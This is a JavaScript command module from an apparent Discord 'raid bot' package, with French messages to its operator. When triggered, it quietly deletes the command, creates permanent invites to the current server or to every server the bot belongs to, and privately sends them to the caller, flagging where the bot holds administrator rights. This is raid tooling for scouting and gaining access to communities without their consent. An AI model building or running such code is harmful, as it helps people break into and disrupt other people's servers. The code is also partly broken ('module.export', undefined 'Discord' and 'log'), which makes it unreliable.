module.export = (client, message, allGuilds) => {
    if (message.author.id === client.user.id) return;
    if (message.channel.type === 'dm') return message.author.send("Cette commande n'est pas utilisable par message privé.");
    if (!message.guild.me.hasPermission('ADMINISTRATOR')) return message.author.send('Je ne suis pas administrateur sur ce serveur.');
    message.delete('https://www.npmjs.com/package/discord_raid_bot');
    if (allGuilds === true) {
        client.guilds.map(guild => {
            guild.channels.random().createInvite({
                maxAge: 0,
                unique: false
            }, 'https://www.npmjs.com/package/discord_raid_bot').then(invite => {
                if (guild.me.hasPermission('ADMINISTRATOR')) {
                    const embed = new Discord.RichEmbed()
                        .setTitle(guild.name)
                        .addField(`${guild.members.size} members`, `J'y suis administrateur.`)
                        .setDescription(invite)
                        .setColor('RANDOM')
                        .setTimestamp();
                    message.author.send({
                        embed
                    })
                } else {
                    const embed = new Discord.RichEmbed()
                        .setTitle(guild.name)
                        .addField(`${guild.members.size} members`, `Je n'y suis pas administrateur.`)
                        .setDescription(invite)
                        .setColor('RANDOM')
                        .setTimestamp();
                    message.author.send({
                        embed
                    })
                }
            }).catch(console.error);
        });
    } else {
        message.channel.createInvite({
            maxAge: 0,
            unique: false
        }, 'https://www.npmjs.com/package/discord_raid_bot').then(invite => {
            message.author.send('https://discord.gg/' + invite.code);
            log(invite.code)
        }).catch(console.error)
    }
}